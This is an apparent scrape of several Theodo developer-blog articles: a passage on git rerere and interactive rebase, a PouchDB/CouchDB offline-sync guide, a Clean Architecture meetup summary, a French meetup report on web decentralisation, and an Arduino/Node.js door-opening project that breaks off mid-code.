a/ice.txt\r\n+++ b/ice.txt\r\n@@@ -1,6 -1,6 +1,7 @@@\r\nThe snow glows white on the mountain tonight\r\nNot a footprint to be seen.\r\n+The show must go on!\r\n+ Come on you stranger, you legend, you martyr, and shine!\r\nand it looks like I'm the Queen\r\nCause living with me must have damn near killed you\r\n\nI enjoin you to commit a resolution yourself too, so that you can see this message appear after the commit:\nRecorded resolution for 'ice.txt'.\r\n[rockify-a-lot 5677725] Merge branch 'feature/pink-floydify' into rockify-a-lot\r\n\nThe resolution is now saved by git, and everytime it does occur again in the future, the saved resolution will be applied automatically!\nThe prestige\nYou don\u2019t believe me (hint: you should not until you see for yourself)? I\u2019ve set up two branches just for that on top of our previous work:\n  * commit 88c2ce424a96566089597f653fc9d51f82a169ff (origin/feature/pink-floydify-again, feature/pink-floydify-again)\r\n  | Author: Jim Morrison <another@legend.com>\r\n  | Date:   Mon Jan 5 23:06:57 2015 +0100\r\n  |\r\n  |     And again for Pink Floyd\r\n  |\r\n* | commit cca913282eea558f84eaf59e084eea9024fd6e04 (origin/rockify-again, rockify-again)\r\n|/  Author: Tristan Roussel <super@disney.fan>\r\n|   Date:   Mon Jan 5 23:01:39 2015 +0100\r\n|\r\n|       I've already seen that\r\n|\r\n* commit 9a4788c3697d60014d3bb8a2a63fab9605d7acc4\r\n| Author: Tristan Roussel <super@disney.fan>\r\n| Date:   Mon Jan 5 22:55:03 2015 +0100\r\n|\r\n|     A brand new start for lyrics\r\n|\r\n* commit 5677725c7d9f8fa6c97de4f79ee9d772c8d6af6d (origin/rockify-everything, rockify-everything)\r\n\nNow, if I do git checkout rockify-again && git merge feature/pink-floydify-again:\nAuto-merging ice-without-nickelback.txt\r\nCONFLICT (content): Merge conflict in ice-without-nickelback.txt\r\nResolved 'ice-without-nickelback.txt' using previous resolution.\r\nAutomatic merge failed; fix conflicts and then commit the result.\r\n\nStill failed, but there is a big difference, with git diff:\ndiff --cc ice-without-nickelback.txt\r\nindex 815a5ee,78d453f..0000000\r\n--- a/ice-without-nickelback.txt\r\n+++ b/ice-without-nickelback.txt\r\n@@@ -1,5 -1,5 +1,6 @@@\r\nThe snow glows white on the mountain tonight\r\nNot a footprint to be seen.\r\n+The show must go on!\r\n+ Come on you stranger, you legend, you martyr, and shine!\r\nand it looks like I'm the Queen\r\n\nThe conflict is resolved using previous knowledge! Just need to add the file and we\u2019re good to go. But I\u2019m lazy, and I want to remove this one more step. Let\u2019s add another option in our configuration git config rerere.autoupdate true and try again with git reset --hard origin/rockify-again && git merge feature/pink-floidify-again:\nAuto-merging ice-without-nickelback.txt\r\nCONFLICT (content): Merge conflict in ice-without-nickelback.txt\r\nStaged 'ice-without-nickelback.txt' using previous resolution.\r\nAutomatic merge failed; fix conflicts and then commit the result.\r\n\nA subtle difference in the message here. Now no more output with git diff, if I try git status:\nOn branch rockify-again\r\nAll conflicts fixed but you are still merging.\r\n(use \"git commit\" to conclude merge)\r\n\r\nChanges to be committed:\r\n\r\nmodified:   ice-without-nickelback.txt\r\n\nAnd with git diff --cached:\ndiff --git a/ice-without-nickelback.txt b/ice-without-nickelback.txt\r\nindex 815a5ee..5fa0715 100644\r\n--- a/ice-without-nickelback.txt\r\n+++ b/ice-without-nickelback.txt\r\n@@ -1,5 +1,6 @@\r\nThe snow glows white on the mountain tonight\r\nNot a footprint to be seen.\r\nThe show must go on!\r\n+Come on you stranger, you legend, you martyr, and shine!\r\nand it looks like I'm the Queen\r\n\nAlready staged, voil\u00e0!\nRealistic use case\nThat was awesome, but I already hear you, this never happens in real life. Ok, let\u2019s show a more real use case.\nThis time I\u2019m mistaken\nRemember our strange lone commit at the beginning? Well, after thinking about it a lot, I\u2019ve decided it wasn\u2019t rocky enough, I want to remove it from my branch rockify-everything and release the branch to master without it. Sounds simple, right? Actually\u2026 what is the git command to erase an old commit, but preserve everything else in place again?\nLet\u2019s do a git rebase --interactive --preserve-merge! A warning first! You have to be aware that we are rewriting history with git rebase so this should absolutely not be done on a branch available to other contributors.\nThe option --preserve-merge here is to ensure we keep the same branch structure, but it can be quite chaotic to use, especially with --interactive. Expect hiccups from time to time.\nOkay, so our command git checkout rockify-everything && git rebase --interactive --preserve-merge master outputs this:\npick b5f87eb Nickelbackify the lyrics :/\r\npick 72ea7a3 Queenify these lyrics!\r\npick 9965c4c Pink Floyd FTW \\o/\r\npick 5677725 Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything\r\n\r\n# Rebase a15f60e..5677725 onto a15f60e\r\n#\r\n# Commands:\r\n#  p, pick = use commit\r\n#  r, reword = use commit, but edit the commit message\r\n#  e, edit = use commit, but stop for amending\r\n#  s, squash = use commit, but meld into previous commit\r\n#  f, fixup = like \"squash\", but discard this commit's log message\r\n#  x, exec = run command (the rest of the line) using shell\r\n#\r\n# These lines can be re-ordered; they are executed from top to bottom.\r\n#\r\n# If you remove a line here THAT COMMIT WILL BE LOST.\r\n#\r\n# However, if you remove everything, the rebase will be aborted.\r\n#\r\n# Note that empty commits are commented out\r\n\nLet\u2019s delete the first commit and see the result (cross fingers!):\nerror: could not apply 9965c4c... Pink Floyd FTW \\o/\r\n\r\nWhen you have resolved this problem, run \"git rebase --continue\".\r\nIf you prefer to skip this patch, run \"git rebase --skip\" instead.\r\nTo check out the original branch and stop rebasing, run \"git rebase --abort\".\r\n\r\nStaged 'ice.txt' using previous resolution.\r\nCould not pick 9965c4ca08bf8a1fdd6b9f89325faa77c9103786\r\n\nHit hard\nWhat happened? Oh, I forgot that by replaying every commit with git rebase, we have to redo the merge commit, and rebase does not care about old conflicts, it just vomits them to you. Imagine doing that and stumbling on a very old merge commit with conflicts and having no idea how to resolve them again? Thank god, rerere saves the day! Resolution being already staged, we just go with git rebase --continue. Result is visible on this branch:\n*   commit 29d2f062660e11952126112a92afe927bf8957dd (origin/rockify-everything-without-nickelback, rockify-everything-without-nickelback)\r\n|\\  Merge: febe698 7792e85\r\n| | Author: Tristan Roussel <super@disney.fan>\r\n| | Date:   Thu Jan 15 22:47:06 2015 +0100\r\n| |\r\n| |     Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything\r\n| |\r\n| |     Conflicts:\r\n| |             ice.txt\r\n| |\r\n| * commit 7792e85579fc86581ba293dda49f6b0223370a5a\r\n|/  Author: Frank Zappa <legend@rock.com>\r\n|   Date:   Mon Jan 5 22:37:39 2015 +0100\r\n|\r\n|       Pink Floyd FTW \\o/\r\n|\r\n* commit febe698833759656bd27e4a79a3343958ba491d4\r\n| Author: Tristan Roussel <super@disney.fan>\r\n| Date:   Mon Jan 5 21:49:23 2015 +0100\r\n|\r\n|     Queenify these lyrics!\r\n|\r\n* commit a15f60e322646347443548bbc6d017c5ae070d88 (origin/master, master)\r\nAuthor: Tristan Roussel <super@disney.fan>\r\nDate:   Mon Jan 5 21:47:52 2015 +0100\r\n\r\nLet it go\r\n\nEnd of the story?\nI still have a few more points to tell.\nCan\u2019t stop off the train\nWhen you enable rerere, it starts recording resolutions.\nHowever, it will not use other conflicts resolutions from when rerere was not enabled and/or from conflicts resolved by other contributors. So my last story might end up being a nightmare again? Fear not! rerere-train is here to save you! It\u2019s a very nice script used to teach conflicts resolutions to git-rerere from existing merge commits.\nLet\u2019s dig in the mud to see it in action. First, let\u2019s wipe out our previous recorded resolutions (it\u2019s for the example, don\u2019t play with .git/ on a real project!):\nrm -r .git/rr-cache/*\r\n\nIf you now retry the super rebase exercise we just did before git checkout rockify-everything && git reset --hard origin/rockify-everything && git rebase --interactive --preserve-merge master, you no longer have your conflicts resolved.\nLet\u2019s teach that again to rerere!\nDownload rerere-train.sh, and now git reset --hard origin/rockify-everything && ./rerere-train.sh HEAD:\nLearning from 5677725 Merge remote-tracking branch 'feature/pink-floydify' into rockify-everything\r\nRecorded resolution for 'ice.txt'.\r\nPrevious HEAD position was 72ea7a3... Queenify these lyrics!\r\nSwitched to branch 'rockify-everything'\r\nYour branch is up-to-date with 'origin/rockify-everything'.\r\n\nIn this simplest form, the script starts from the commit you specified and go through every parent commit to look for conflicts.\nRevert the resolutions \\o/\nWhat if the resolution given by rerere doesn\u2019t suit you? If you have resolutions already staged for a merge commit on my-file.ext for example, there is a nice trick to unresolve them: git checkout --conflict merge my-file.ext. You can now teach a new resolution to rerere. This is, by the way, useful outside rerere use cases.\nLastly, I told you git rebase --preserve-merge --interactive is chaotic, so let\u2019s try not to anger the beast. To ease your job with it, try to select a root commit that is a parent of every branch involved in the rebase. In my case, origin/master was in a sweet position for that. When rewriting history, you might come across empty commits, either because you are provoking them right now with the changes, or because they already existed. This will stop the rebase process in the middle. To avoid that, add the option --keep-empty to rebase and the empty commits will be accepted during the workflow.\nBonus question (I still do not have a simple answer for that yet, so please tell me if you know!)\nDepending on your workflow, if you use --no-ff with merge, you may create real merge commits where a fast-forward merge could have occured. In this case, git rebase --preserve-merge --interactive will fail miserably on these commits and tell you something like that:\nerror: Commit 16118aede40d66e6dfe039d7a99d84b3da8224c6 is a merge but no -m option was given.\r\nfatal: cherry-pick failed\r\nCould not pick 16118aede40d66e6dfe039d7a99d84b3da8224c6\r\n\nSo, my question: how to tune the rebase command to smoothly process those commits too?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn some of our projects, we need to build mobile applications that can be used offline. In this article, Valentin presented a fast way to develop native applications for both iOS and Android using a single code base in JavaScript. This time, instead of writing native applications, we thought that the current mobile browsers were performant enough to efficiently run JavaScript.\nThanks to that choice, the application is closer to what we are used to develop everyday at Theodo, and we can use cool technologies such as NodeJS, AngularJS, Gulp\u2026 (some Theodoers wrote some articles on these subjects like this Angular tutorial or this Gulp book).\nBut there are still some questions to answer. The main one concerns data circulating in our application. Indeed, most of the features of our application can be used offline (the joy of working with a client-side language :-)), but it is worthless if all the work made at this moment is lost or unavailable for other users.\nThus, we were looking for a way to store data when you are offline and to make it available when you are back online. PouchDB does exactly that. This JavaScript library works the same way as a CouchDB database and enables data replication between a server-side database and a client-side database.\nBut, first, what is CouchDB ?\n\nCouchDB is an open source NoSQL database using JSON to store data. It is a document-oriented database that can be requested by HTTP.\nIn other words, if you have a CouchDB instance running in your local environment on the port 5984 and you want to see the document having the id \u2018document_id\u2019 on the database \u2018test\u2019, all you have to do is make a GET request on the URL :\n    http://localhost:5984/test/document_id\r\n\nThen, the response will look like this:\n    {\r\n        \"_id\":\"document_id\",\r\n        \"_rev\":\"946B7D1C\",\r\n        \"subject\":\"CouchDB presentation\",\r\n        \"author\":\"Yann\",\r\n        \"postedDate\":\"2014-07-04T17:30:12Z-04:00\",\r\n        \"tags\":[\"couchdb\", \"relax\", \"nosql\"],\r\n        \"body\":\"It is as simple as this to retrieve a document from a CouchDB database!\"\r\n    }\r\n\nAs you may guess, it is as easy to create, update or delete a document, by making a POST, PUT or DELETE request to the database.\nCouchDB comes with other features, like the possibility to define filters. For instance, if I have a CouchDB database containing a set of messages whose author can be Alice or Bob, and I define the following document:\n    {\r\n        \"_id\": \"_design/app\",\r\n        \"_rev\": \"1-b20db05077a51944afd11dcb3a6f18f1\",\r\n        \"filters\": {\r\n            \"name\": \"function(doc, req) { if(doc.name == req.query.author) { return true; }\r\n                     else { return false; }}\"\r\n        }\r\n    }\r\n\nOn this URL :\n    http://localhost:5984/db/_changes?filter=app/name?author=Alice\r\n\nI will see all the documents matching the filter \u2018name\u2019 with \u2018Alice\u2019 standing for the parameter \u2018author\u2019, another way to say that the response will contain all the messages written by Alice!\nBut we haven\u2019t seen yet the main reason of why CouchDB should be chosen over any other database system for our initial needs. This choice is driven by the fact that CouchDB is made to easily replicate databases. At the end of a replication between two CouchDB databases, all active documents on the source database are also in the destination database and all documents that were deleted in the source databases are also deleted (if they existed) on the destination database.\nYou should not be afraid to override important data that you want to keep during this process, each document comes with a revision id, and all the history of a document is stored and available. It\u2019s up to you to handle conflicts that can be introduced by incompatible changes made by different users on a database.\nNow that we have seen how CouchDB can be used, let\u2019s see how PouchDB can be used in our project, and how he interacts with CouchDB.\nPouchDB, the JavaScript database that syncs\nFirst, to install PouchDB you can use npm, bower or simply download the sources if you don\u2019t use any of these tools (I recommend you to use them).\nOnce ready, you will see that creating a new PouchDb database is as simple as:\n    var db = new PouchDB('dbname');\r\n\nThe CRUD operations are also intuitive to write, for instance the method used to fetch a document is\n    db.get(docId, [options], [callback])\r\n\nFor other methods you can believe me or check their documentation there. I will just emphasize on the method permitting to replicate from or to a distant CouchDB database\n    db.replicate.to(remoteDB, [options]);\r\n    // or\r\n    db.replicate.from(remoteDB, [options]);\r\n\nGiven all these tools, we build our application following this general architecture:\n\n\nAfter being authenticated by the server, we create a new PouchDB database and we replicate this user\u2019s data from the CouchDB database running on the server, thanks to a filter similar to the one presented earlier.\n\n\n\n\nWhen a user is logged, all his actions are stored in the PouchDB database. When it is possible (i.e if the user is online), a process of continuous synchronization sends all the PouchDB data to the CouchDB database and vice versa.\n\n\n\nJust before user logout, we launch one last time a replication process from the PouchDB database to the CouchDB one, then we destroy the PouchDB database.\n\nIt works like a charm, but you have to be cautious about some issues. First, even if it is possible to do it, it is not recommended to store your attachments in a PouchDB or a CouchDB database. As explained in this article, it fattens your database and makes the login replication last much longer.\nNext, be restrictive about the data you replicate. The lighter it is, the faster it will be to replicate or request in. For example, use your CouchDB filter only for the last revisions of your documents by using the \u2018?style=main_only\u2019 option in your request. The idea is to avoid outdated documents that are not compatible anymore with your code.\nTo conclude with, thanks to PouchDB we manage to build an application that could store data locally while it\u2019s offline, and send it to a central CouchDB database as soon as it is online. Enjoy it, and if you need any extra feature, develop it and make a Pull Request to the GitHub project!\nBonus\nHow can I migrate A MySQL database to a CouchDB one?\nIf you consider writing a new app using CouchDB for an existing business, with its existing SQL database keeping these data is a key point. A way to do it is to use of the Node.js library cradle. It is a CouchDB client that allows every operation that we are used to make with CouchDB. Coupled with a MySQL client such as node-mysql, it is possible to make a MySQL query, and store all that you need in new CouchDB documents. Run this task periodically and your CouchDB database will be \u201cin sync\u201d with the MySQL database.\nBe aware to save a new CouchDB document only if it was modified. CouchDB stores all the revisions of a document, save documents when they are unmodified will increase the database size without any valuable reason. The following script can be used as a skeleton (it is written in CoffeeScript):\n_       = require 'underscore'\r\nyamljs  = require 'yamljs'\r\nmysql   = require 'mysql'\r\ncradle  = require 'cradle'\r\n\r\nfile    = fs.readFileSync(__dirname + '/../config.yml', 'utf8')\r\noptions = yamljs.parse(file)\r\n\r\nconnection = mysql.createConnection(\r\n  user:     options.mysql.user\r\n  password: options.mysql.password\r\n  database: options.mysql.db\r\n)\r\n\r\nquery = \"\"\"\r\n        SELECT * FROM ... WHERE ...\r\n        \"\"\"\r\n\r\ndb = new (cradle.Connection)().database(options.couchdb)\r\n\r\nconnection.query query, (err, rows, fields) =>\r\n    throw err  if err\r\n\r\n    _.each rows, (row) ->\r\n        _.map row, (field, key) ->\r\n            try\r\n                row[key] = decodeURIComponent(escape(field)) if _.isString(field)\r\n            catch error\r\n                console.log \"#{error} | #{field}\"\r\n\r\n        newDocument =\r\n            user:\r\n                firstname:  row.firstname\r\n                lastname:   row.lastname\r\n                username:   row.username\r\n            location:\r\n                address:    row.address\r\n                city:       row.city\r\n                postalCode: row.postalCode\r\n                country:    row.country\r\n\r\n        db.save(newDocument)\r\n\nHow does PouchDB work?\nTo store the documents locally, PouchDB uses the database embedded in the user\u2019s browser. By default, it will be an IndexedDB database in Firefox/Chrome/IE, WebSQL in Safari and LevelDB in Node.js.\nAccording to the browser, different size limits exist for this local database, but as long as you stay with JSON documents and small attachments you don\u2019t have to worry for it.\nYou can override this choice by creating your PouchDB database this way :\nvar pouch = new PouchDB('myDB', {adapter: 'websql'}); // can also be idb, leveldb or http\r\nif (!pouch.adapter) { // websql not supported by this browser\r\n  pouch = new PouchDB('myDB');\r\n}\r\n\nFor most of its operations, PouchDB operates as an intermediate between a JavaScript app and these local databases. However, it interacts differently during the process of replication, where PouchDB should be able to communicate with a CouchDB database for instance. Moreover, in the case of a continuous replication, it would be better to replicate only the last changes made in the source database.\nActually, an incremental id is given to every modification on a PouchDB or CouchDB document. These ids are used as checkpoints in the process of replication. After checking all the changes between the last checkpoint replicated and the last change made, these modifications are sent by batches to the destination database. Each batch is processed one by one, and the id of the last change replicated of a batch is marked as the new checkpoint.\nThis way, the replication process only copies the changes needed.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYann Jacquot\r\n  \t\t\t\r\n  \t\t\t\tYann Jacquot is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI went to SfPot meetup at Pepini\u00e8re 27 (website, Twitter) on second to last Friday with fellow colleagues Simon, Thierry, Kinga, and Paul.\nOne particular talk retained my attention and I want to tell you about it.\nLet me warn you first, this is just an introduction, and I\u2019m not going into much detail, don\u2019t hesitate to post comments if you feel something is not clear, or deserves a better exposure!\nClean architecture (in French \u201cDesign applicatif avec symfony2\u201d): slides by Romain Kuzniak (GitHub, Twitter), technical manager @openclassroms\nSo. What is Clean Architecture? It\u2019s so fresh that it doesn\u2019t even have a Wikipedia article.\n\nLet\u2019s start by what it\u2019s trying to accomplish.\nThe aim of Clean Architecture is to favor change, by keeping the change cost of a product the most constant possible during the developement process.\nIn a few words, it\u2019s an evolution of Domain Driven Design (a.k.a DDD), with more abstractions.\nIt\u2019s based on UseCase Drive Design (another *DD \\o/) and Hexagonal Architecture (a.k.a Ports and Adapters)\nObjectives\n\nManage complex architectures, it probably isn\u2019t suited to run a small personal blog.\nBe independent from the framework, the UI and the infrastructure, for versatility.\nBe highly testable.\n\nPrinciples\n\nThe domain is at the center of the application.\nCommunication between application layers is done through abstractions.\nSOLID principles are followed.\nThe architecture reveals its intentions.\n\nD from DDD\nThis is Domain.\nBusiness rules are carried by the elements of the domain.\nIn Symfony, this means we code the business logic directly inside the entities, this is the essence of DDD.\nThe reasoning behind this choice is that business rules should apply independently from the context, as opposed to applicative rules.\nLet\u2019s give an example to explain the difference, strongly inspired from Romain\u2019s talk.\nWe want to build an agile board (Jira is a very good example).\n\nIn the domain there are two entities:\n\nSprints\nIssues\n\nIssues have two different states, open or closed, and a sprint can also be either open or closed.\nThere are issues in a sprint.\nIssues without sprint are in the backlog.\nAs a user, I want to be able to close a sprint, either manually through clicking a button on my browser, or automatically depending on the sprint previously filled closing date.\n\nIf I close the sprint manually, I want to get a nice report in my browser telling me how the sprint went with graphs, and statistics.\nIf it\u2019s closed automatically, let\u2019s say I only want the number of closed issues logged into a file.\nEither way, when the sprint is closed, remaining open issues in the sprint should be removed from it and automatically placed in the top of the backlog.\n\nThis last rule, represents a business rule.\nAnytime a sprint is closed, it should be applied.\nThe two former rules on the contrary, strongly depending from the context, are applicative rules.\nWhy am I talking about DDD?\nDomain takes care of business rules, closing a sprint would be the responsibility of the sprint itself.\nBut where do we put the applicative rules?\nThat\u2019s where Clean Architecture comes to the rescue, it\u2019s the next evolution.\nA picture is worth a thousand words\nOkay. Let\u2019s see a diagram of what we\u2019re talking about (again, from Romain):\n\nThis is Clean Architecture.\nWow. I mean. WOW. What are all these abstraction layers?\n<I> denotes an interface whereas <A> denotes an abstract class.\nLet\u2019s talk about the red spot, it seems to be the important part.\nUse Case\nUse Case is indeed the central point of Clean Architecture.\nIt\u2019s the part describing how an applicative rule works.\nLet\u2019s describe its key characteristics with our agile board example:\n\n\n\nSpecs of the Use Case\nIllustration \n\n\n\n\nIt represents an applicative rule, and therefore is named after it\nUse Case: My name is \u201cManually close the sprint\u201d\n\n\nIt takes in input a Use Case request\nRequest to Use Case: I want to close sprint #9\n\n\nIt has only one method, execute\nUse Case: Well, let\u2019s close sprint #9 busy busy\n\n\nIt uses entities gateways to get the entities needed to work with\nUse Case to Entity Gateway: I need the sprint #9 entity\n\n\nIt uses the entities to apply business rules\nUse Case to Sprint: close yourself!\n\n\nIt answers with a Use Case response\nUse Case Response: Here is the report, mate\n\n\n\nAbstract entity\nWe go deeper (or higher depending on the point of view) in the abstraction.\nThe entity represents only the business rules associated to the Domain element.\nNo need to bother with data in the Use Case layer which is carried at the entity implementation level.\nFun fact, your entity implementation of a particular entity needs not to always be the same.\nIn some cases, you may find it relevant to implement it differently, for example, depending on if it comes from a database or an API call.\nAll these abstractions are here to ensure we captured the essence of the applicative rule.\nIt\u2019s therefore completely framework, UI and infrastructure agnostic.\nAnd, the use cases represent faithfully the functional features of our application.\nAs a bonus, with so much decoupling, it\u2019s (nearly) a pleasure to write tests!\n\nI won\u2019t lie, there is a cost to it, we need a huge amount of classes to develop, so the feature cost is higher than in a simpler architecture.\nBut, the experience of Romain with this architecture set up at openclassrooms shows that the benefit is that the feature cost tends to increase really much more slowly over time.\nController\nThe controller layer is in charge of getting the request, it can be a Symfony Controller, or a Command, or an API Controller. It\u2019s in charge of sending requests to use cases.\nPresenter\nThe presenter is in charge of getting responses from use cases, and render views from it. Views can be HTML pages, a file, a printed document etc. In Symfony apps, the controller is in charge of this responsibility.\nThe frontiers\nThe only things allowed to go through the layer borders are simple DTO.\nThis ensures the maximum decoupling of the layers as they cannot transmit logic between them.\nCan you stop using big words and show us some code?\n\nRomain\u2019s talk is far from being a job half done.\nHere is the code used in his slides to present the difference between 4 architectures in a Symfony app context:\n\nMVC\nN-tiers\nDDD\nAnd finally Clean Architecture\n\nI can\u2019t stress this enough, but the talk slides (in French) are amazing and provide great explanation for these examples.\nI want to try it at home, or at work!\nA warning first.\nBe sure to understand that Clean Architecture is a tool, it\u2019s not a miracle.\nThere are situations where this tool is not very fitted, and it\u2019s important to know when you should use it.\nThe first thing you need is a complex architecture, to leverage the entry cost.\nSo if you\u2019re developing a POC, now is probably not the best time to use Clean Architecture.\nBe sure that complexity is inherent to your product and required for it to work.\nBe sure to have a team ready for this (even a team of one!).\nIt requires discipline to write interfaces for nearly everything, to put the logic where it belongs, to respect the layers boundaries etc.\nA strong review process and pair programming (and open minds!) help a lot to instill the architecture in everyone.\nBe ready to dig into the mud.\nClean architecture is incredibly recent, and unstable.\nThere is neither a lot of literature, nor a lot of feedbacks on the subject.\nBe ready to make it evolve, you will be part of the shaping, you will need to iterate.\nEverything won\u2019t be granted, and there is a chance of failure, so assess your risks carefully.\nOn the other hand, it integrates very well with agile methodologies and with TDD.\nI\u2019m sure, I really wanna use Clean Architecture. How do I start?\n\nGreat! Romain presented us a very nice PHP implementation of Clean Architecture he developed at openclassrooms.\nI encourage you to try it and contribute to it.\nThis is just an introduction to Clean Architecture, and some concepts might not be obvious to everyone, so if you need, ask Romain, he\u2019s a very nice person!\nAnd for people using Symfony, try the bundle!\nOther resources\nFrom Robert C. Martin (a.k.a Uncle Bob), the creator:\n\nTalk\nBlog entry\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Roussel\r\n  \t\t\t\r\n  \t\t\t\tAfter graduating from l'\u00c9cole Normale Sup\u00e9rieure in mathematics, Tristan explored various jobs: trading, theoretical research in computer science, data analysis and business development. He finally found his way at Theodo in 2013 as a web developer-architect. He works mainly with Symfony and front-end JavaScript frameworks, and is particularly fond of git.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tJe suis all\u00e9 jeudi 23 Octobre au 3\u00e8me meetup pour la d\u00e9centralisation du web \u00e0 la Fondation Mozilla de Paris.\nAu menu, pas de pr\u00e9sentation de techno mais une profonde r\u00e9flexion sur le devenir d\u2019internet \u00e0 travers deux conf\u00e9rences : Framasoft sur Degooglisons le Net et Laurent Chemla sur CaliOpen.\nPour ceux qui ont loup\u00e9 cette super soir\u00e9e, pas de souci : une redifusion des confs est disponible sur\u00a0air.mozilla.org\u00a0et un compte-rendu est en construction sur\u00a0framasoft.org.\nEn deux mots :\nI) Pierre-Yves Gosset nous a pr\u00e9sent\u00e9 Framasoft. C\u2019est une plateforme informative sur les logiciels libres qui cherche \u00e0 :\n\nsensibiliser\u00a0\u00e0 l\u2019utilisation de logiciels libres avec leur site\nd\u00e9montrer\u00a0que le libre \u00e7a marche en proposant leur utilisation directement sur leur site\nessaimer\u00a0en incitant les gens \u00e0 faire leur propre installation des ces logiciels\n\nII) Laurent Chemla, le premier pirate informatique \u00e0 avoir \u00e9t\u00e9 condamn\u00e9 par la justice fran\u00e7aise, nous a pr\u00e9sent\u00e9 CaliOpen. C\u2019est un futur nouveau service de mail qui ressemblera \u00e0 ce que Google cherche \u00e0 faire avec Inbox : un service centralis\u00e9 de moyen de communication priv\u00e9. La plus-value de CaliOpen sera la cotation par un \u201cprivacy index\u201d (un indice de confidentialit\u00e9) de nos contacts et plus largement de tout le contenu du service. Un utilisateur qui utilise PGP pour encrypter ses mails aura une bonne note tandis qu\u2019un utilisateur de Gmail r\u00e9sidant aux \u00c9tats-Unis aura une note d\u00e9sastreuse.\nVoil\u00e0 2 petites citations de Laurent Chemla pour finir :\nOn estime qu\u2019ECHELON, l\u2019anc\u00eatre de PRISM a rapport\u00e9 25 milliards de dollars en contrat\nL\u2019objectif n\u2019est pas d\u2019\u00eatre s\u00fbr \u00e0 100%, \u00e7a n\u2019existe pas. On cherche juste \u00e0 d\u00e9multiplier les co\u00fbts de l\u2019espionnage.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt Theodo we face various issues, and sometimes it starts at the very beginning of the day.\n\nFor safety concerns, the front door of the company does not have a handle, and only opens with a key or RFID\npass.\nWhile Theodo had few employees, RFID passes were enough. But with the company development, and in prevision of new developers who regularly join us, we wanted to set up a simpler and more flexible solution allowing Theodoers to be autonomous.\n\nWe are using Google Apps to handle company user accounts, and Google offers a powerful OAuth 2.0 API to authenticate users. Bazinga! Let\u2019s build a solution to open the front door with our smartphones using Google API.\n\nSummary\nHere is a summary of the technologies we are going to use:\n\nNext to the door an Arduino, connected to the network and whose only job is to listen for a private key and send the opening instruction to the door if the key is valid.\nFor authentication a simple Node.js application, implementing OAuth 2.0 protocol. If the user email domain is theodo.fr, the application sends the valid private key to the Arduino\nAs a bonus, an HTML5 manifest will make the application load instantly because we don\u2019t like to wait!\n\nStill interested? Here are the details:\nArduino\nFirst of all an Arduino, connected to the company network and listening to incoming connections. Arduino runs programs written in C. In our case, the code is widely inspired of https://github.com/guyzmo/FlyingDoor. We only removed the beeps, and changed the expected message from \u201c1\u201d to a more complex private key.\nNode.js\nThe second part of our development consisted of being able to open the door using Node.js. Node.js offers powerful modules for almost everything. Here we only want to send a message to a server, let\u2019s use net module.\n// lib/client/door.js\r\nvar net = require('net');\r\n\r\nfunction open() {\r\n    var client = new net.Socket();\r\n    client.connect(\"1337\", \"192.168.1.1\", function() {\r\n        console.log(\"Opening the Door\");\r\n        client.write(\"MY_AWESOME_PRIVATE_KEY\" + \"\\r\");\r\n    });\r\n\r\n    client.on(\"data\", function(data) {\r\n        console.log(\"Receiving response : \" + data);\r\n\r\n        if (\"CLOSE\\n\" == data) {\r\n            client.end();\r\n        }\r\n    });\r\n}\r\n\nQuite easy! We connect to the server port and send it the private key. The server answers \u201cOPEN\u201d, sleeps for 2 seconds then sends \u201cCLOSE\u201d. Once the \u201cCLOSE\u201d message has been received, we disconnect our client.\nWeb interface with Express framework\nNow that the node client had been developed, we needed a simple interface to display buttons. We decided to use Express Node.js framework with Jade templates, and Bootstrap CSS for buttons.\n//layout.jade\r\ndoctype html\r\n    html\r\n    head\r\n        title Theodo Door\r\n        link(rel='stylesheet', href='/stylesheets/bootstrap.min.css')\r\n        link(rel='stylesheet', href='/stylesheets/style.css')\r\n    body\r\n        block content\r\n\r\n//index.jade\r\nextends 